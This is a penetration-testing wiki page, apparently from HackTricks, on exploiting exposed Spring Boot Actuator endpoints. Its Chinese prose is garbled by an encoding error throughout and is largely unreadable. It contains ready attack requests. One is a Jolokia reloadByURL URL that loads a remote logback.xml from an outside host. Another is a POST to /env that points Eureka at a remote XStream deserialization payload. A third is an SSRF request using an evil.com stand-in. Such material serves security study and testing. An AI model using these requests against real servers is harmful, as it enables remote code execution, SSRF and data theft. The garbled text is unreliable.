# Spring Actuators

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**æ¥è‡ª** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## åˆ©ç”¨ Spring Boot Actuators

**æŸ¥çœ‹åŸå§‹å¸–å­** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **å…³é”®ç‚¹ï¼š**

* Spring Boot Actuators æ³¨å†Œçš„ç«¯ç‚¹åŒ…æ‹¬ `/health`ã€`/trace`ã€`/beans`ã€`/env` ç­‰ã€‚åœ¨ 1 åˆ° 1.4 ç‰ˆæœ¬ä¸­ï¼Œè¿™äº›ç«¯ç‚¹æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®ã€‚ä» 1.5 ç‰ˆæœ¬å¼€å§‹ï¼Œåªæœ‰ `/health` å’Œ `/info` é»˜è®¤æ˜¯éæ•æ„Ÿçš„ï¼Œä½†å¼€å‘äººå‘˜é€šå¸¸ä¼šç¦ç”¨æ­¤å®‰å…¨æ€§ã€‚
* æŸäº› Actuator ç«¯ç‚¹å¯èƒ½ä¼šæš´éœ²æ•æ„Ÿæ•°æ®æˆ–å…è®¸æœ‰å®³æ“ä½œï¼š
* `/dump`ã€`/trace`ã€`/logfile`ã€`/shutdown`ã€`/mappings`ã€`/env`ã€`/actuator/env`ã€`/restart` å’Œ `/heapdump`ã€‚
* åœ¨ Spring Boot 1.x ä¸­ï¼Œactuators æ³¨å†Œåœ¨æ ¹ URL ä¸‹ï¼Œè€Œåœ¨ 2.x ä¸­ï¼Œå®ƒä»¬ä½äº `/actuator/` åŸºç¡€è·¯å¾„ä¸‹ã€‚

### **åˆ©ç”¨æŠ€æœ¯ï¼š**

1. **é€šè¿‡ '/jolokia' è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ**ï¼š
* `/jolokia` actuator ç«¯ç‚¹æš´éœ²äº† Jolokia åº“ï¼Œå…è®¸å¯¹ MBeans è¿›è¡Œ HTTP è®¿é—®ã€‚
* `reloadByURL` æ“ä½œå¯ä»¥è¢«åˆ©ç”¨æ¥ä»å¤–éƒ¨ URL é‡æ–°åŠ è½½æ—¥å¿—é…ç½®ï¼Œè¿™å¯èƒ½å¯¼è‡´ç›²ç›® XXE æˆ–é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„ XML é…ç½®è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚
* ç¤ºä¾‹åˆ©ç”¨ URLï¼š`http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`ã€‚
2. **é€šè¿‡ '/env' è¿›è¡Œé…ç½®ä¿®æ”¹**ï¼š
* å¦‚æœå­˜åœ¨ Spring Cloud åº“ï¼Œ`/env` ç«¯ç‚¹å…è®¸ä¿®æ”¹ç¯å¢ƒå±æ€§ã€‚
* å¯ä»¥æ“çºµå±æ€§ä»¥åˆ©ç”¨æ¼æ´ï¼Œä¾‹å¦‚ Eureka serviceURL ä¸­çš„ XStream ååºåˆ—åŒ–æ¼æ´ã€‚
* ç¤ºä¾‹åˆ©ç”¨ POST è¯·æ±‚ï¼š

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **å…¶ä»–æœ‰ç”¨çš„è®¾ç½®**ï¼š
* å±æ€§å¦‚ `spring.datasource.tomcat.validationQuery`ã€`spring.datasource.tomcat.url` å’Œ `spring.datasource.tomcat.max-active` å¯ä»¥è¢«æ“çºµä»¥è¿›è¡Œå„ç§åˆ©ç”¨ï¼Œä¾‹å¦‚ SQL æ³¨å…¥æˆ–æ›´æ”¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚

### **é™„åŠ ä¿¡æ¯ï¼š**

* é»˜è®¤ actuators çš„å…¨é¢åˆ—è¡¨å¯ä»¥åœ¨ [è¿™é‡Œ](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) æ‰¾åˆ°ã€‚
* Spring Boot 2.x ä¸­çš„ `/env` ç«¯ç‚¹ä½¿ç”¨ JSON æ ¼å¼è¿›è¡Œå±æ€§ä¿®æ”¹ï¼Œä½†ä¸€èˆ¬æ¦‚å¿µä¿æŒä¸å˜ã€‚

### **ç›¸å…³ä¸»é¢˜ï¼š**

1. **Env + H2 RCE**ï¼š
* å…³äºåˆ©ç”¨ `/env` ç«¯ç‚¹å’Œ H2 æ•°æ®åº“ç»„åˆçš„è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨ [è¿™é‡Œ](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database) æ‰¾åˆ°ã€‚
2. **é€šè¿‡é”™è¯¯çš„è·¯å¾„åè§£é‡Šåœ¨ Spring Boot ä¸Šè¿›è¡Œ SSRF**ï¼š
* Spring æ¡†æ¶å¯¹ HTTP è·¯å¾„åä¸­çŸ©é˜µå‚æ•° (`;`) çš„å¤„ç†å¯ä»¥è¢«åˆ©ç”¨è¿›è¡ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (SSRF)ã€‚
* ç¤ºä¾‹åˆ©ç”¨è¯·æ±‚ï¼š

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
</details>
{% endhint %}
